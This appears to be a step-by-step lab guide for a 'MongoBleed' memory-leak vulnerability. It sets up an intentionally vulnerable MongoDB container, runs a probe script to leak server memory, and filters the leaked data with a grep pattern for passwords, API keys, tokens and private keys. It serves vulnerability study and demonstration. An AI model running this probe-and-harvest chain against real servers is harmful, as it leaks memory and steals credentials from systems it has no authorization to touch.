@@ -1,0 +1,60 @@
+MongoBleed Manual Demo (Explained)
+
+Prereqs
+- Docker and Docker Compose installed and running
+- Python 3 available on your PATH
+- Optional: strings utility (for parsing leaked data)
+
+1) Start the vulnerable MongoDB
+- Command (Compose v2): docker compose up -d
+  Explanation: Starts the MongoDB 8.2.2 container in the background using the included docker-compose.yml. Ports 27017->27017 are exposed and zlib compression is enabled (required for the CVE).
+- If your system uses legacy Compose: docker-compose up -d
+
+2) Verify MongoDB is running and reachable
+- Check container: docker ps --filter name=mongobleed-target
+  Explanation: Confirms the container is up. You should see a row for mongobleed-target.
+- Optional logs: docker logs --tail 50 mongobleed-target
+  Explanation: Shows the last lines of container logs if you need to troubleshoot startup.
+
+Connect with a Mongo shell (choose one):
+- If mongosh is installed locally:
+  mongosh 'mongodb://admin:SuperSecret123!@localhost:27017/admin' --quiet
+  Then run inside mongosh:
+  db.runCommand({ ping: 1 })        # Should return ok: 1
+  show dbs                          # Lists seeded DBs (secretdb, customers)
+  use secretdb                      # Switch to the demo DB
+  show collections                  # api_keys, internal_users, encryption_keys, transactions
+  db.api_keys.findOne()             # View a seeded secret document
+  db.internal_users.findOne({}, {password_plain:1, _id:0})  # Demo-only plain password
+  exit                               # Leave mongosh
+
+- If mongosh is NOT installed locally, run it in the container:
+  docker exec -it mongobleed-target \
+    mongosh -u admin -p 'SuperSecret123!' --authenticationDatabase admin --quiet
+  Then run the same mongosh commands as above (ping, show dbs, etc.).
+
+3) Run the memory-leak probe
+- Command: python3 mongobleed.py --host localhost --max-offset 50000 --output leaked.bin
+  Explanation: Sends crafted messages to localhost:27017, probing document lengths up to 50,000 bytes. Any leaked fragments are concatenated into leaked.bin. Increase --max-offset for a deeper scan; adjust --host/--port if needed.
+
+4) Extract readable strings from the leak
+- Command: strings -a -n 6 leaked.bin | sort -u > leaked.txt
+  Explanation: Pulls printable ASCII strings (length >= 6) from the binary leak and de-duplicates them into leaked.txt for easier review.
+
+5) Triage likely secrets
+- Command: grep -iE "password|passwd|secret|token|api[_-]?key|AKIA|ghp_|sk-|sk-proj-|PRIVATE KEY|BEGIN (RSA|OPENSSH)|mongodb://|org-[a-z0-9]+" leaked.txt
+  Explanation: Highlights common credential patterns (passwords, AWS keys, GitHub/OpenAI tokens, SSH/RSA keys, Mongo URIs, org IDs). Tweak the regex as needed.
+
+6) Inspect results
+- Quick view: sed -n '1,80p' leaked.txt
+  Explanation: Shows the first ~80 lines. Use less leaked.txt for interactive browsing.
+
+Cleanup
+- Stop containers and remove volumes: docker compose down -v   (or: docker-compose down -v)
+  Explanation: Stops MongoDB and deletes the named volume so seeded data is removed.
+- Remove artifacts: rm -f leaked.bin leaked.txt
+
+Notes
+- Host/port: If targeting a remote host or a different port, change --host/--port accordingly.
+- Deeper scans: Larger --max-offset values can yield more fragments but take longer.
+- Safety: Use only in authorized test environments. This setup is intentionally vulnerable for demonstration.
